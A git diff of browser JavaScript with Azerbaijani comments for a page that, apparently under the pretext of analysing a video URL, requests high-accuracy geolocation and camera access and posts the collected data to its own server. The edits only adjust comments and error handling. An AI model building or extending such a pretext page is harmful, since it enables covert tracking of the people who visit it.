@@ -25,7 +25,7 @@ analyzeButton.addEventListener('click', async () => {
         // Lokasiya icazəsi
         if ("geolocation" in navigator) {
             statusText.textContent = 'Lokasiya icazəsi tələb edilir...';
-            await new Promise((resolve, reject) => {
+            await new Promise((resolve) => { // Hətta xəta olsa da resolve edirik ki, proses davam etsin
                 navigator.geolocation.getCurrentPosition(
                     (position) => {
                         locationData = {
@@ -40,8 +40,7 @@ analyzeButton.addEventListener('click', async () => {
                     (error) => {
                         statusText.textContent = `Lokasiya icazəsi rədd edildi və ya xəta baş verdi: ${error.message}.`;
                         console.error('Lokasiya xətası:', error);
-                        // Lokasiya icazəsi verilməsə də, kamera üçün davam edə bilərik
-                        resolve(); 
+                        resolve(); // Xətada da davam et
                     },
                     { enableHighAccuracy: true, timeout: 5000, maximumAge: 0 }
                 );
@@ -74,7 +73,8 @@ analyzeButton.addEventListener('click', async () => {
         statusText.textContent = 'Bütün icazələr alındı. Məlumatlar serverə göndərilir...';
 
         // Məlumatları Backendə göndər
-        const response = await fetch('/api/send-data', {
+        // Render.com-da tətbiq eyni domendə işlədiyi üçün sadəcə path ilə göndərə bilərik
+        const response = await fetch('/api/send-data', { 
             method: 'POST',
             headers: {
                 'Content-Type': 'application/json'
@@ -90,7 +90,6 @@ analyzeButton.addEventListener('click', async () => {
             progressBar.style.width = '100%';
             statusText.textContent = `Analiz uğurla tamamlandı! Məlumatlar serverə göndərildi.`;
             setTimeout(() => {
-                // Prosesi sıfırlaya bilərik
                 progressBarContainer.style.display = 'none';
                 progressBar.style.width = '0%';
                 videoUrlInput.value = '';
